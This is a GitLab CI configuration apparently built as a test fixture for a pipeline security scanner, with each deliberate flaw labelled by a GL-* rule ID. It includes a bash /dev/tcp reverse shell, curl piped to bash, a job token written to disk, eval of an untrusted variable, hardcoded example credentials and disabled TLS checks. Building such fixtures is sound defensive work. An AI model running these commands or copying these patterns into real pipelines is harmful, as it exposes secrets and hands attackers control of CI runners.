# Realistic insecure GitLab CI exhibiting every GL-* failure mode.
include:
  - project: 'templates/ci'
    ref: main
  - remote: 'https://gitlab.example.com/snippets/42/raw'
  # GL-011 — local include resolved from the MR branch.
  - local: 'ci/local-helpers.yml'

image: python:latest

# GL-028 — top-level services image not pinned.
services:
  - postgres:latest

variables:
  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
  DATABASE_PASSWORD: hunter2
  DEPLOY_TARGET: production

# GL-011 — opt the pipeline into MR triggering so include: local fires.
workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
    - if: '$CI_COMMIT_BRANCH'

# GL-012 — cache key derived from MR-controlled commit ref.
cache:
  key: build-${CI_COMMIT_REF_NAME}
  paths:
    - .cache/

stages:
  - test
  - ingest
  - deploy

unit-tests:
  stage: test
  image: node
  script:
    - echo "Running tests for MR ${CI_MERGE_REQUEST_TITLE}"
    - npm test

# GL-010 — multi-project artifact ingestion without verification.
ingest-upstream:
  stage: ingest
  needs:
    - project: 'platform/build'
      job: 'package'
      ref: main
      artifacts: true
  script:
    - ./package/install.sh

deploy-prod:
  stage: deploy
  # GL-014 — self-managed runner without ephemeral tag.
  # GL-032 — ``$CI_COMMIT_REF_NAME`` (the pusher-controlled branch /
  # tag) is in the runner-tag list, so the pusher picks which tagged
  # runner pool the deploy lands on.
  tags:
    - custom-runner
    - $CI_COMMIT_REF_NAME
  # GL-029 — manual deploy without allow_failure:false silently
  # defaults to allow_failure:true, so the pipeline reports success
  # even when an operator never clicks the button.
  when: manual
  script:
    - ./scripts/deploy.sh

# GL-030 — job-level trigger:include: pulls a child pipeline from a
# floating branch in another project (same class of risk as GL-005
# but nested under trigger: rather than the top-level include:).
trigger-child:
  stage: deploy
  trigger:
    include:
      - project: 'platform/child-pipelines'
        ref: main

# GL-031 — id_tokens: declared without an audience pin AND without
# an environment binding. The empty ``aud:`` accepts any consumer's
# OIDC trust; the missing ``environment:`` means any branch can
# drive the role assumption.
oidc-deploy:
  stage: deploy
  id_tokens:
    AWS_ID_TOKEN:
      aud: ""
  script:
    - aws sts assume-role-with-web-identity
        --role-arn arn:aws:iam::123456789012:role/release
        --role-session-name release
        --web-identity-token "$AWS_ID_TOKEN"
    - aws s3 cp dist/ s3://release-bucket/ --recursive

# GL-016 — curl piped to shell.
# GL-017 — docker run --privileged.
# GL-018 — pip install from insecure source.
# GL-019 — no vulnerability scanning step.
# GL-020 — CI_JOB_TOKEN written to file.
insecure-setup:
  stage: test
  script:
    - curl https://example.com/setup.sh | bash
    - docker run --privileged myimage
    - pip install --trusted-host pypi.internal.com package
    - echo "$CI_JOB_TOKEN" >> /tmp/token.txt
    # GL-021: package install without lockfile enforcement.
    - npm install
    # GL-022: dependency update bypasses lockfile pins.
    - npm update
    # GL-025: evidence of malicious activity — bash /dev/tcp reverse shell.
    - bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    # GL-023: TLS verification bypass.
    - git config --global http.sslVerify false
    # GL-026: dangerous shell idiom — eval re-parses the value as shell.
    - eval "$CI_CUSTOM_CMD"
    # GL-027: pip install from an unpinned git URL.
    - pip install git+https://example.com/internal/helper.git
